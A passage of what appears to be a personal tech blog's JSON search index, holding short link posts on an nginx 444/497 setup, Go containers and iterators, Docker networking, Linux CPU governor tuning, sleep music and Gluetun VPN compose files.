listen [::]:5678 ssl; server_name example.zz.ac; ssl_certificate ...; ssl_certificate_key ..; error_page 497 @close; location @close { return 444; } ... } server { listen 5678 ssl default_server;; listen [::]:5678 ssl default_server;; server_name _; ssl_certificate ...; ssl_certificate_key ..; return 444; } ","date":"October 2, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20251002-hide-web/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://tao.zz.ac/homelab/hide-web.html\" target=\"_blank\" rel=\"noopener\"\u003e降低家用 Web 服务被通报的概率\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过明文协议尝试请求 HTTPS 服务在 Nginx 中有分配特殊的 497 状态码。如果发生该报错，我们希望 Nginx 直接关闭连接，不返回任何响应。这需要用到另外一个非标状态码 444，综合两种状态码，我们需要在 server 中增加如下配置：\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_page\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e497\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e444\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用 error_page 指令为 497 状态码设置虚拟路径@close，Nginx 在处理的@close 时发现是返回 444 状态码，于是直接关闭连接。\u003c/p\u003e\n\u003cp\u003e这个时候你再用 curl 访问对应的端口就会收到如下报错：\u003c/p\u003e\n\u003cp\u003ecurl \u003ca href=\"http://example.zz.ac:5678\" target=\"_blank\" rel=\"noopener\"\u003ehttp://example.zz.ac:5678\u003c/a\u003e\ncurl: (52) Empty reply from server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[::]:5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eexample.zz.ac\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e...\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eerror_page\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e497\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e@close\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e444\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[::]:5678\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e...\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e444\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","NGINX"],"title":"降低家用 Web 服务被通报的概率"},{"categories":["URL","EFF","Browser","Extension"],"contents":" Privacy Badger：EFF 推出的免費瀏覽器擴充套件，用來阻止網路監控追蹤 ","date":"September 29, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250929-eff-browser-extension/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://privacybadger.org/\" target=\"_blank\" rel=\"noopener\"\u003ePrivacy Badger：EFF 推出的免費瀏覽器擴充套件，用來阻止網路監控追蹤\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","EFF","Browser","Extension"],"title":"Privacy Badger：EFF 推出的免費瀏覽器擴充套件，用來阻止網路監控追蹤"},{"categories":["URL","Golang","Container"],"contents":" Containers From Scratch by Golang (feat. Liz Rice) container-from-scratch-golang As we enhance the functionality of our small program, we will explore the following topics, allowing us to create a basic simulation of a non-production container environment.\nUTS Namespace Chroot PID Namespace Mount Namespace Control Group Rootless Container ","date":"September 10, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250910-containers-from-scratch-by-golang-feat-liz-rice/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://baconyao.notion.site/Containers-From-Scratch-by-Golang-feat-Liz-Rice-2638a3a7d9d48053ae1dce0763fb52e8\" target=\"_blank\" rel=\"noopener\"\u003eContainers From Scratch by Golang (feat. Liz Rice)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/baconYao/container-from-scratch-golang\" target=\"_blank\" rel=\"noopener\"\u003econtainer-from-scratch-golang\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAs we enhance the functionality of our small program, we will explore the following topics, allowing us to create a basic simulation of a non-production container environment.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUTS Namespace\u003c/li\u003e\n\u003cli\u003eChroot\u003c/li\u003e\n\u003cli\u003ePID Namespace\u003c/li\u003e\n\u003cli\u003eMount Namespace\u003c/li\u003e\n\u003cli\u003eControl Group\u003c/li\u003e\n\u003cli\u003eRootless Container\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Golang","Container"],"title":"Containers From Scratch by Golang (feat. Liz Rice)"},{"categories":["URL","Golang"],"contents":" 淺談 Go Iterator type Seq[V any] func(yield func(V) bool) type Seq2[K, V any] func(yield func(K, V) bool) ","date":"September 6, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250906-golang-iterator/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ganhua.wang/go-iterator\" target=\"_blank\" rel=\"noopener\"\u003e淺談 Go Iterator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eSeq\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eany\u003c/span\u003e] \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eyield\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eSeq2\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003eK\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eany\u003c/span\u003e] \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eyield\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eK\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eV\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Golang"],"title":"淺談 Go Iterator"},{"categories":["URL","Linux","Docker","nftables"],"contents":" Docker 容器无法访问外网？nftables 下的 NAT 配置指南 ","date":"September 3, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250903-linux-docker-nftables/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ibytebox.com/archives/docker-rong-qi-wu-fa-fang-wen-wai-wang-nftables-xia-de-nat-pei-zhi-zhi-nan\" target=\"_blank\" rel=\"noopener\"\u003eDocker 容器无法访问外网？nftables 下的 NAT 配置指南\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Linux","Docker","nftables"],"title":"Docker 容器无法访问外网？nftables 下的 NAT 配置指南"},{"categories":["URL","Linux","CPU"],"contents":" 独立服务器 CPU 频率最大化配置指南 看看 CPU 现在混哪种模式 前提条件 系统：Linux（Debian、Ubuntu、Proxmox 等都行）\n权限：root\nCPU：支持动态调频（Intel Xeon、AMD EPYC / Ryzen 等）\ngovernor cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor\npowersave：节能小绵羊（频率锁低，省电但废武功） ondemand：按需加速（要用时才升频，可能反应慢半拍） performance：全程高能（我们要的就是它！💪） 确认内核到底用的哪种驱动（Intel / AMD） cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_driver\n临时拉满性能 for cpu in /sys/devices/system/cpu/cpu[0-9]*; do echo performance \u0026gt; $cpu/cpufreq/scaling_governor done 重启后也保持高能 方案 A：最稳妥推荐 apt install cpufrequtils -y echo \u0026#39;GOVERNOR=\u0026#34;performance\u0026#34;\u0026#39; \u0026gt;/etc/default/cpufrequtils systemctl enable cpufrequtils systemctl start cpufrequtils 方案 B：systemd 自定义服务 # /etc/systemd/system/cpu-performance.service [Unit] Description=Set CPU governor to performance After=multi-user.target [Service] Type=oneshot ExecStart=/bin/bash -c \u0026#39;for cpu in /sys/devices/system/cpu/cpu[0-9]*; do echo performance \u0026gt; $cpu/cpufreq/scaling_governor; done\u0026#39; [Install] WantedBy=multi-user.target systemctl daemon-reexec systemctl daemon-reload systemctl enable --now cpu-performance.service ","date":"September 2, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250902-linux-cpu-performance/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ibytebox.com/archives/02cf4c4a-0af7-43f1-bb65-ccdb54a52306\" target=\"_blank\" rel=\"noopener\"\u003e独立服务器 CPU 频率最大化配置指南\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"看看-cpu-现在混哪种模式\"\u003e看看 CPU 现在混哪种模式\u003c/h2\u003e\n\u003cp\u003e前提条件\n系统：Linux（Debian、Ubuntu、Proxmox 等都行）\u003c/p\u003e\n\u003cp\u003e权限：root\u003c/p\u003e\n\u003cp\u003eCPU：支持动态调频（Intel Xeon、AMD EPYC / Ryzen 等）\u003c/p\u003e\n\u003ch3 id=\"governor\"\u003egovernor\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ecat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003epowersave：节能小绵羊（频率锁低，省电但废武功）\u003c/li\u003e\n\u003cli\u003eondemand：按需加速（要用时才升频，可能反应慢半拍）\u003c/li\u003e\n\u003cli\u003eperformance：全程高能（我们要的就是它！💪）\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"确认内核到底用的哪种驱动intel--amd\"\u003e确认内核到底用的哪种驱动（Intel / AMD）\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ecat /sys/devices/system/cpu/cpu0/cpufreq/scaling_driver\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"临时拉满性能\"\u003e临时拉满性能\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e cpu in /sys/devices/system/cpu/cpu\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e0-9\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e*; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  echo performance \u0026gt; $cpu/cpufreq/scaling_governor\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"重启后也保持高能\"\u003e重启后也保持高能\u003c/h2\u003e\n\u003ch3 id=\"方案-a最稳妥推荐\"\u003e方案 A：最稳妥推荐\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapt install cpufrequtils -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;GOVERNOR=\u0026#34;performance\u0026#34;\u0026#39;\u003c/span\u003e \u0026gt;/etc/default/cpufrequtils\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable cpufrequtils\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl start cpufrequtils\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"方案-bsystemd-自定义服务\"\u003e方案 B：systemd 自定义服务\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# /etc/systemd/system/cpu-performance.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eSet CPU governor to performance\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eoneshot\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;for cpu in /sys/devices/system/cpu/cpu[0-9]*; do echo performance \u0026gt; $cpu/cpufreq/scaling_governor; done\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl daemon-reexec\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable --now cpu-performance.service\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","CPU"],"title":"独立服务器 CPU 频率最大化配置指南"},{"categories":["URL","Music","lullaby"],"contents":" 6 首國際最強公認催眠曲 Marconi Union - Weightless 432Hz (深度治癒身心靈 連接宇宙能量) Clair de Lune Deep sleep delta waves - Binaural beats sleep (30 分鐘版本) Erik SATIE - Gymnopédie No. 1 (鋼琴慢速版) Himalayan Healing - Tibetan Singing Bowls Meditation (15 分鐘版本) ","date":"August 29, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250829-music/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.instagram.com/p/DNakVD4P_t9\" target=\"_blank\" rel=\"noopener\"\u003e6 首國際最強公認催眠曲\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eMarconi Union - Weightless\u003c/li\u003e\n\u003cli\u003e432Hz (深度治癒身心靈 連接宇宙能量)\u003c/li\u003e\n\u003cli\u003eClair de Lune\u003c/li\u003e\n\u003cli\u003eDeep sleep delta waves - Binaural beats sleep (30 分鐘版本)\u003c/li\u003e\n\u003cli\u003eErik SATIE - Gymnopédie No. 1 (鋼琴慢速版)\u003c/li\u003e\n\u003cli\u003eHimalayan Healing - Tibetan Singing Bowls Meditation (15 分鐘版本)\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Music","lullaby"],"title":"6首國際最強公認催眠曲"},{"categories":["URL","Docker","Linux"],"contents":" 透過 LinuxServer.io 打包的 Docker 映像檔，將桌面程式轉成網頁版，透過瀏覽器即可使用 LinuxServer.io 官網 ","date":"August 1, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250801-linuxserver.io/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/linuxserver-io-docker-applications/\" target=\"_blank\" rel=\"noopener\"\u003e透過 LinuxServer.io 打包的 Docker 映像檔，將桌面程式轉成網頁版，透過瀏覽器即可使用\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.linuxserver.io/our-images\" target=\"_blank\" rel=\"noopener\"\u003eLinuxServer.io 官網\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Docker","Linux"],"title":"透過LinuxServer.io打包的Docker映像檔，將桌面程式轉成網頁版，透過瀏覽器即可使用"},{"categories":["URL","Docker","Gluetun","VPN"],"contents":" Gluetun：讓 Docker 容器走 VPN 連線，沒網路就斷線，使用教學 Gluetun OpenVPN services: gluetun: image: qmcgaw/gluetun container_name: gluetun restart: unless-stopped cap_add: - NET_ADMIN devices: - /dev/net/tun:/dev/net/tun ports: - 8888:8888/tcp # HTTP proxy - 8388:8388/tcp # Shadowsocks - 8388:8388/udp # Shadowsocks volumes: - /home/user/gluetun:/gluetun environment: # 按照VPN供應商的OpenVPN設定檔填寫 - VPN_SERVICE_PROVIDER=protonvpn - VPN_TYPE=openvpn - OPENVPN_USER= # OpenVPN帳號 - OPENVPN_PASSWORD= # OpenVPN密碼 - SERVER_COUNTRIES=United Kingdom # 指定伺服器所在國家，以逗號分隔 networks: # (選擇性) 固定Gluetun容器的IP network: ipv4_address: 172.27.0.5 networks: # (選擇性) 固定Gluetun容器的IP network: driver: bridge ipam: config: - subnet: 172.27.0.0/16 gateway: 172.27.0.5 WireGuard services: gluetun: image: qmcgaw/gluetun container_name: gluetun restart: unless-stopped cap_add: - NET_ADMIN devices: - /dev/net/tun:/dev/net/tun ports: - 8888:8888/tcp # HTTP proxy - 8388:8388/tcp # Shadowsocks - 8388:8388/udp # Shadowsocks volumes: - /home/user/gluetun:/gluetun environment: - VPN_SERVICE_PROVIDER=protonvpn # 按照VPN供應商的WireGuard設定檔填寫 - VPN_TYPE=wireguard - WIREGUARD_PRESHARED_KEY= # 預共享密鑰 - WIREGUARD_PRIVATE_KEY= # 私鑰 - WIREGUARD_ADDRESSES= # 填IPV4與IPV6位址，以逗號分隔 - SERVER_COUNTRIES=United Kingdom # 指定伺服器所在國家，以逗號分隔 networks: # (選擇性) 固定Gluetun容器的IP network: ipv4_address: 172.27.0.5 networks: # (選擇性) 固定Gluetun容器的IP network: driver: bridge ipam: config: - subnet: 172.27.0.0/16 gateway: 172.27.0.5 讓容器走 Gluetun 的 VPN 連線 如果容器服務跟 Gluetun 寫在同一個 docker-compose：加入網路模式 network_mode: \u0026ldquo;service:gluetun\u0026rdquo; 如果該容器跟 Gluetun 不是寫在同一個 docker-compose：加入 network_mode: \u0026ldquo;container:gluetun\u0026rdquo; 開啟 Gluetun 的 docker-compose 檔案，把 service 用到的通訊埠(ex:8080)加回來 依序啟動 Gluetun 和 走 Gluetun 的 VPN 連線的服務 容器公共 IP 應當跟您選擇的 VPN 伺服器一致 ","date":"August 1, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250801-gluetun-vpn-docker/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/gluetun-vpn-docker/\" target=\"_blank\" rel=\"noopener\"\u003eGluetun：讓 Docker 容器走 VPN 連線，沒網路就斷線，使用教學\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"gluetun\"\u003eGluetun\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eOpenVPN\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003egluetun\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eqmcgaw/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan 